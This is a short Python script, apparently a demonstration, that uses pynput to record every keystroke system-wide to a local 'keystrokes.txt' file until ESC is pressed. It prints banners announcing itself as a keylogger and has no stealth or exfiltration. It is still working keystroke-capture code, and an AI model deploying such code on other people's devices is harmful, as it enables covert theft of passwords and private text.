from pynput import keyboard

LOG_FILE = "keystrokes.txt"

def print_banner(title):
    print("\n" + "=" * 50)
    print(title.center(50))
    print("=" * 50 + "\n")

def on_press(key):
    try:
        # Capture standard character keys
        log_entry = f"{key.char}"
    except AttributeError:
        # Capture and format special keys
        if key == keyboard.Key.space:
            log_entry = " "
        elif key == keyboard.Key.enter:
            log_entry = "\n[ENTER]\n"
        elif key == keyboard.Key.backspace:
            log_entry = " [BACKSPACE] "
        else:
            log_entry = f" [{key.name.upper()}] "

    # Append recorded character to the log file
    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

def on_release(key):
    # Press ESC key to stop the keylogger
    if key == keyboard.Key.esc:
        print_banner("*** STOPPING KEYLOGGER ***")
        return False

if __name__ == "__main__":
    print_banner("*** KEYLOGGER SOFTWARE ***")
    print("STATUS: LISTENING FOR KEYBOARD EVENTS...")
    print("INSTRUCTION: TYPE ANYWHERE. PRESS 'ESC' TO STOP LOGGING.\n")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    print("-" * 50)
    print(f"SUCCESS: KEYSTROKES SAVED TO '{LOG_FILE}'")
    print("-" * 50 + "\n")